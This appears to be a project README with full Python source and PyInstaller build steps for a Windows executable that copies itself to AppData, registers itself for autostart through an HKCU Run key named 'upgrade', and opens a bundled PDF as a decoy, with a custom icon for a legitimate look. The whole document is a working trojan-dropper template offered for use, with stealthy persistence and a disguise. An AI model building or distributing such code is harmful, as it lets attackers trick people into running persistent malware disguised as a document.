# 🛠️ Persistence Script with PDF Execution and Custom Icon

This project demonstrates a Windows-based Python script designed for **persistence** by adding itself to the system's registry and automatically executing a bundled **PDF** file. Additionally, it supports assigning a custom **icon (.ico)** to the final `.exe` file.

---

## 🔍 Features

- Copies itself to the `AppData` directory for stealthy persistence.
- Adds a registry key under `HKCU\...\Run` to run automatically at startup.
- Extracts and opens a bundled `PDF` file when executed.
- Supports setting a custom `.ico` file for a professional-looking executable.

---

## 🧪 Setup & Usage

### 1. Python Script

```python
import time
import subprocess
import os
import shutil
import sys

def add_to_registry():
    # persistence
    new_file = os.environ["appdata"] + "\\deneme.exe"
    if not os.path.exists(new_file):
        shutil.copyfile(sys.executable, new_file)
        regedit_command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + new_file
        subprocess.call(regedit_command, shell=True)

add_to_registry()

def open_added_file():
    added_file = sys._MEIPASS + "\\deneme.pdf"
    subprocess.Popen(added_file, shell=True)

open_added_file()
```

### 2. Prepare Required Files

- `deneme.pdf` → The PDF file to be opened
- `icon.ico` → Custom icon file for the `.exe`

### 3. Compile with PyInstaller

```bash
pyinstaller --onefile --add-data "deneme.pdf;." --icon=icon.ico scriptname.py
```

> The `--icon=icon.ico` argument sets a custom icon for the executable, improving its appearance in Windows Explorer or the desktop.

---

## ⚙️ How It Works

- `add_to_registry()`:
  - Copies the running `.exe` to `%APPDATA%\deneme.exe`.
  - Adds a registry key under `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` to ensure execution on user login.

- `open_added_file()`:
  - Uses `sys._MEIPASS` to locate and run `deneme.pdf` bundled within the PyInstaller package.

---
